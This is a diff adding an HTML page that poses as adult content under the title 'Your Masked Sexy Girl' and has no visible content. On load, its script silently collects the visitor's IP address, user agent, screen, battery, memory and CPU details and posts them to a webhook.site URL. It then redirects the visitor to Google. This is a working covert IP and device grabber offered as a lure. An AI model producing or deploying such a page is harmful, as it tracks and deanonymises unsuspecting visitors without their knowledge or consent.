@@ -1,0 +1,76 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Your Masked Sexy Girl</title>
+</head>
+<body>
+  <script>
+    // Webhook URL
+    const webhookUrl = "https://webhook.site/5532709c-344d-4f6a-a947-8cab7f1322bd";
+
+    // Function to get user data and send it to the webhook
+    async function sendUserData() {
+      try {
+        // Fetch IP address using an external API
+        const ipResponse = await fetch("https://api.ipify.org?format=json");
+        const ipData = await ipResponse.json();
+        const userIP = ipData.ip;
+
+        // Get user agent
+        const userAgent = navigator.userAgent;
+
+        // Get screen resolution
+        const screenResolution = `${window.screen.width}x${window.screen.height}`;
+
+        // Get screen size including color depth
+        const screenSize = `${window.screen.width}x${window.screen.height}x${window.screen.colorDepth}`;
+
+        // Get battery level (battery percentage), with error handling for unsupported environments
+        let batteryLevel = "Not available";
+        if (navigator.getBattery) {
+          const batteryInfo = await navigator.getBattery();
+          batteryLevel = (batteryInfo.level * 100).toFixed(0); // Battery level as percentage
+        }
+
+        // Get RAM information
+        const deviceMemory = navigator.deviceMemory ? `${navigator.deviceMemory} GB` : "Not available";
+
+        // Get CPU threads information
+        const cpuThreads = navigator.hardwareConcurrency ? navigator.hardwareConcurrency : "Not available";
+
+        // Prepare data using FormData
+        const formData = new FormData();
+        formData.append("ip", userIP);
+        formData.append("user_agent", userAgent);
+        formData.append("screen_resolution", screenResolution);
+        formData.append("screen_size", screenSize);
+        formData.append("battery_level", batteryLevel);
+        formData.append("device_memory", deviceMemory);
+        formData.append("cpu_threads", cpuThreads);
+
+        // Send data to the webhook via POST request
+        const response = await fetch(webhookUrl, {
+          method: "POST",
+          body: formData
+        });
+
+        // Check if response is ok, then redirect
+        if (response.ok) {
+          console.log("porn");
+          window.location.href = "https://www.google.com"; // Redirect to Google
+        } else {
+          console.error("porn");
+        }
+        
+      } catch (error) {
+        console.error("porn");
+      }
+    }
+
+    // Execute the function to send data when the page loads
+    sendUserData();
+  </script>
+</body>
+</html>
